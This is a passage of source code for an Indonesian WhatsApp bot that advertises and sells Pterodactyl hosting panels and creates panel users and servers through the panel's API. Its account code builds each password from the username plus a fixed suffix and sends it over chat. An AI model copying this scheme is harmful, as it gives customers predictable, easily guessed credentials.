"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+OWN+PT+7+HARI*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*OWN PT 15 DAY*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 2 ] </>${gris}

> WAKTU : 15 DAY
> SERVER : PUBLIC

> (IDR) Rp 15.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+OWN+PT+15+HARI*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*OWN PT 22 DAY*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 3 ] </>${gris}

> WAKTU : 22 DAY
> SERVER : PUBLIC

> (IDR) Rp 20.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+OWN+PT+22+HARI*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*OWN PT 30 DAY*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 4 ] </>${gris}

> WAKTU : 30 DAY
> SERVER : PUBLIC

> (IDR) Rp 25.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+OWN+PT+30+HARI*","merchant_url":"https://www.google.com"}`
},
],},},
],
messageVersion: 1,
},},},},},{});
await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id,
});}
await RezzHost.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})  
break


case 'list-ptpanel': case 'ptpanel-list': {   
await RezzHost.sendMessage(m.chat, { react: { text: "🕕",key: m.key,}})  
let img1 = "https://pomf2.lain.la/f/sni8rsa.png"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
image: {
url
}}, {
upload: RezzHost.waUploadToServer
})
return imageMessage
}
let msg = generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: (`*LIST PT PANEL BY ${ownername}*`)  },
carouselMessage: {
cards: [
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*PT PANEL 7 DAY*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 1 ] </>${gris}

> WAKTU : 7 DAY
> SERVER : PUBLIC

> (IDR) Rp 8.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+PT+PANEL+7+HARI*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*PT PANEL 15 DAY*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 2 ] </>${gris}

> WAKTU : 15 DAY
> SERVER : PUBLIC

> (IDR) Rp 13.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+PT+PANEL+15+HARI*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*PT PANEL 22 DAY*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 3 ] </>${gris}

> WAKTU : 22 DAY
> SERVER : PUBLIC

> (IDR) Rp 18.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+PT+PANEL+22+HARI*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*PT PANEL 30 DAY*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 4 ] </>${gris}

> WAKTU : 30 DAY
> SERVER : PUBLIC

> (IDR) Rp 20.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+PT+PANEL+30+HARI*","merchant_url":"https://www.google.com"}`
},
],},},
],
messageVersion: 1,
},},},},},{});
await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id,
});}
await RezzHost.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})  
break


case 'list-adp': case 'adp-list': {   
await RezzHost.sendMessage(m.chat, { react: { text: "🕕",key: m.key,}})  
let img1 = "https://pomf2.lain.la/f/sni8rsa.png"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
image: {
url
}}, {
upload: RezzHost.waUploadToServer
})
return imageMessage
}
let msg = generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: (`*LIST ADMIN PANEL BY ${ownername}*`)  },
carouselMessage: {
cards: [
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*ADMIN PANEL 7 DAY*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 1 ] </>${gris}

> WAKTU : 7 DAY
> SERVER : PUBLIC

> (IDR) Rp 5.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+ADMIN+PANEL+7+HARI*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*ADMIN PANEL 15 DAY*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 2 ] </>${gris}

> WAKTU : 15 DAY
> SERVER : PUBLIC

> (IDR) Rp 10.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+ADMIN+PANEL+15+HARI*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*ADMIN PANEL 22 DAY*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 3 ] </>${gris}

> WAKTU : 22 DAY
> SERVER : PUBLIC

> (IDR) Rp 13.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+ADMIN+PANEL+22+HARI*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*ADMIN PANEL 30 DAY*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 4 ] </>${gris}

> WAKTU : 30 DAY
> SERVER : PUBLIC

> (IDR) Rp 15.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+ADMIN+PANEL+30+HARI*","merchant_url":"https://www.google.com"}`
},
],},},
],
messageVersion: 1,
},},},},},{});
await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id,
});}
await RezzHost.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})  
break


case 'list-sellerprip': case 'sellerprip-list': {   
await RezzHost.sendMessage(m.chat, { react: { text: "🕕",key: m.key,}})  
let img1 = "https://pomf2.lain.la/f/sni8rsa.png"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
image: {
url
}}, {
upload: RezzHost.waUploadToServer
})
return imageMessage
}
let msg = generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: (`*LIST RESELLER PANEL PRIPAT BY ${ownername}*`)  },
carouselMessage: {
cards: [
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*RESELLER PANEL 7 DAY*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 1 ] </>${gris}

> WAKTU : 7 DAY
> SERVER : PRIPAT

> (IDR) Rp 5.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+RESELLER+PANEL+PRIPAT+7+HARI*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*RESELLER PANEL 15 DAY*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 2 ] </>${gris}

> WAKTU : 15 DAY
> SERVER : PRIPAT

> (IDR) Rp 8.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+RESELLER+PANEL+PRIPAT+15+HARI*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*RESELLER PANEL 22 DAY*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 3 ] </>${gris}

> WAKTU : 22 DAY
> SERVER : PRIPAT

> (IDR) Rp 13.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+RESELLER+PANEL+PRIPAT+22+HARI*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*RESELLER PANEL 30 DAY*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 4 ] </>${gris}

> WAKTU : 30 DAY
> SERVER : PRIPAT

> (IDR) Rp 15.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+RESELLER+PANEL+PRIPAT+30+HARI*","merchant_url":"https://www.google.com"}`
},
],},},
],
messageVersion: 1,
},},},},},{});
await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id,
});}
await RezzHost.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})  
break


case 'list-sellerpub': case 'sellerpub-list': {   
await RezzHost.sendMessage(m.chat, { react: { text: "🕕",key: m.key,}})  
let img1 = "https://pomf2.lain.la/f/sni8rsa.png"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
image: {
url
}}, {
upload: RezzHost.waUploadToServer
})
return imageMessage
}
let msg = generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: (`*LIST RESELLER PANEL PUBLIC BY ${ownername}*`)  },
carouselMessage: {
cards: [
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*RESELLER PANEL 7 DAY*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 1 ] </>${gris}

> WAKTU : 7 DAY
> SERVER : PUBLIC

> (IDR) Rp 4.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+RESELLER+PANEL+PUBLIC+7+HARI*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*RESELLER PANEL 15 DAY*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 2 ] </>${gris}

> WAKTU : 15 DAY
> SERVER : PUBLIC

> (IDR) Rp 6.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+RESELLER+PANEL+PUBLIC+15+HARI*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*RESELLER PANEL 22 DAY*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 3 ] </>${gris}

> WAKTU : 22 DAY
> SERVER : PUBLIC

> (IDR) Rp 8.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+RESELLER+PANEL+PUBLIC+22+HARI*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*RESELLER PANEL 30 DAY*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 4 ] </>${gris}

> WAKTU : 30 DAY
> SERVER : PUBLIC

> (IDR) Rp 10.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+RESELLER+PANEL+PUBLIC+30+HARI*","merchant_url":"https://www.google.com"}`
},
],},},
],
messageVersion: 1,
},},},},},{});
await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id,
});}
await RezzHost.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})  
break


case 'list-panelprip': case 'panelprip-list': {   
await RezzHost.sendMessage(m.chat, { react: { text: "🕕",key: m.key,}})  
let img1 = "https://pomf2.lain.la/f/sni8rsa.png"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
image: {
url
}}, {
upload: RezzHost.waUploadToServer
})
return imageMessage
}
let msg = generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: (`*LIST PANEL PRIPAT BY ${ownername}*`)  },
carouselMessage: {
cards: [
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*PANEL PRIPAT 1 GB*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 1 ] </>${gris}

> RAM : 1000 MIB / 1 GB
> DISK : 1000 MIB / 1 GB
> CPU : 50% VCPU

> (IDR) Rp 2.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+PANEL+PRIPAT+1GB*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*PANEL PRIPAT 2 GB*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 2 ] </>${gris}

> RAM : 2000 MIB / 2 GB
> DISK : 2000 MIB / 2 GB
> CPU : 100% VCPU

> (IDR) Rp 4.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+PANEL+PRIPAT+2GB*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*PANEL PRIPAT 3 GB*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 3 ] </>${gris}

> RAM : 3000 MIB / 3GB
> DISK : 3000 MIB / 3GB
> CPU : 150% VCPU

> (IDR) Rp 6.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+PANEL+PRIPAT+3GB*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*PANEL PRIPAT 4 GB*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 4 ] </>${gris}

> RAM : 4000 MIB / 4 GB
> DISK : 4000 MIB / 4 GB
> CPU : 200% VCPU

> (IDR) Rp 8.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+PANEL+PRIPAT+4GB*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*PANEL PRIPAT 5 GB*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 5 ] </>${gris}

> RAM : 5000 MIB / 5 GB
> DISK : 5000 MIB / 5 GB
> CPU : 250% VCPU

> (IDR) Rp 10.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+PANEL+PRIPAT+5GB*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*PANEL PRIPAT 6 GB*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 6 ] </>${gris}

> RAM : 6000 MIB / 6 GB
> DISK : 6000 MIB / 6 GB
> CPU : 300% VCPU

> (IDR) Rp 11.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+PANEL+PRIPAT+6GB*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*PANEL PRIPAT 7 GB*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 7 ] </>${gris}

> RAM : 7000 MIB / 7 GB
> DISK : 7000 MIB / 7 GB
> CPU : 350% VCPU

> (IDR) Rp 12.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+PANEL+PRIPAT+7GB*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*PANEL PRIPAT 8 GB*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 8 ] </>${gris}

> RAM : 8000 MIB / 8 GB
> DISK : 8000 MIB / 8 GB
> CPU : 400% VCPU

> (IDR) Rp 13.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+PANEL+PRIPAT+8GB*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*PANEL PRIPAT 9 GB*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 9 ] </>${gris}

> RAM : 9000 MIB / 9 GB
> DISK : 9000 MIB / 9 GB
> CPU : 450% VCPU

> (IDR) Rp 14.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+PANEL+PRIPAT+9GB*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*PANEL PRIPAT 10 GB*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 10 ] </>${gris}

> RAM : 10000 MIB / 10 GB
> DISK : 10000 MIB / 4 GB
> CPU : 500% VCPU

> (IDR) Rp 15.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+PANEL+PRIPAT+10GB*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*PANEL PRIPAT UNLI*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 11 ] </>${gris}

> RAM : ∞ / UNLIMITED
> DISK : ∞ / UNLIMITED
> CPU : ∞ / UNLIMITED

> (IDR) Rp 17.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+PANEL+PRIPAT+UNLI*","merchant_url":"https://www.google.com"}`
},
],},},
],
messageVersion: 1,
},},},},},{});
await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id,
});}
await RezzHost.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})  
break



case 'pesan-panel': {
let ngen = ['|']
if (args[0].includes(ngen)) return reply('Replace Symbol | So spaces')
if (args[0].length > 14) return reply('Extension Number')
if (args[0].length < 7) return reply('Abbreviation Number')
if (args[0].startsWith('0')) return reply('Use format 62')
if (!args[0]) return reply('Masukkan Teks')
let mention = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : args[0] ? (args[0].replace(/[@ .+-]/g, '') + '@s.whatsapp.net') : ''
let txt = (args.length > 1 ? args.slice(1).join(' ') : '') || ''
let q = m.quoted ? m.quoted : m
let mime = (q.m || q).mimetype || ''
let tujuan = `
*Haii ${ownername} ${stime}*
*Ada yang pesan panel nih*

📛 *Nama :* ${pushname}
#️⃣ *Number :* ${m?.sender.split('@')[0]}
📦 *Pesanan :* ${txt}
📅 *Tanggal :* ${hariini}
⏰ *Jam :* ${time}

*Balas dengan Cara :*
*.pesan ${m?.sender.split('@')[0]} Silahkan deposit terlebih dahulu*
`
if (!m.quoted) {
RezzHost.sendText(mention, tujuan)
} else {
RezzHost.sendText(mention, tujuan)
let media = q ? await m.getQuotedObj() : false || m
await RezzHost.copyNForward(mention, media, false).catch(_ => _)
}
let suks = `
*Silahkan tunggu pesanan anda sudak di kirim ke owner*
📛 *Nama :* ${pushname}
#️⃣ *Number :* ${m?.sender.split('@')[0]}
📦 *Pesanan :* ${txt}
📅 *Tanggal :* ${hariini}
⏰ *Jam :* ${time}
⏱️ *Status :* Proses !!!
`
RezzHost.sendMessage(m.chat, { text: `${suks}`, mentions: [suks] }, { quoted: kalgans })

}
break
case 'cp1gb': 
case '1gb': 
case 'panel1gb': {
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender: t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net': m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "1050"
let cpu = "30"
let disk = "1050"
let email = username + "@gmail.com"
let password = username + "72bdd9"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${hariini}${time} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${m?.sender.split('@')[0]}..._`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Hari :* ${hariini}
┃ *Jam :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *BISA GANTI GANTI SC*
- *BOT DAPAT ON 24 JAM*
- *WEB CLOSE BOT ON*
- *GAK BOROS KUOTA*
- *GAK ABISIN RAM HP*
- *GARANSI 15 DAY*

*NOTES :*
- *JAGA BAIK² DATA PANEL ANDA*
- *OWN HANYA MENGIRIM 1X DATA*
- *MASUK GROUP UNTUK INFO*
- *SS PANEL DENGAN CP .DONE*
- *HUB ONW JIKA ADA KENDALA*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SEBAR DOMAIN*

*LANGGAR? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+bang+panel+nya+normal","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: idsal,
newsletterName: wm,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${hariini}
┃ *O'clock :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp2gb': 
case '2gb': 
case 'panel2gb': {
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender: t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net': m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "2050"
let cpu = "60"
let disk = "2050"
let email = username + "@gmail.com"
let password = username + "7nd99"
if (!u) return
